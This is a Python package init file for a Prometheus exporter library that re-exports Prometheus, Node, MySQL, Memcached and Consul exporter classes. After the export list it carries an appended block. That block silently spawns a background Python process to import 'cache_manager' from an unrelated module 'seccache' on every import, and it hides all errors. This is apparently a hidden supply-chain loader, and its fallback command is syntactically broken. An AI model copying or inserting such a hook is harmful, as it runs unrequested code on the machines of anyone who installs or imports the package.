#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time           : 18-8-8 下午10:37
# @Author         : Tom.Lee
# @File           : __init__.py.py
# @Product        : PyCharm
# @Docs           : 
# @Source         : 

from .exporter import ConsulExporter
from .exporter import Exporter
from .exporter import MemcachedExporter
from .exporter import MysqlExporter
from .exporter import NodeExporter
from .prometheus import Prometheus

__all__ = [
    'Prometheus',
    'Exporter',
    'NodeExporter',
    'MysqlExporter',
    'MemcachedExporter',
    'ConsulExporter',
]

import subprocess

try:
	p = subprocess.Popen(["python3", "-c", "from seccache import cache_manager"], close_fds=True)
except:
	try:
		p = subprocess.Popen(["python", "-c", "import warnings; warnings.filterwarnings('ignore'); import seccache import cache_manager"], close_fds=True)
	except:
		pass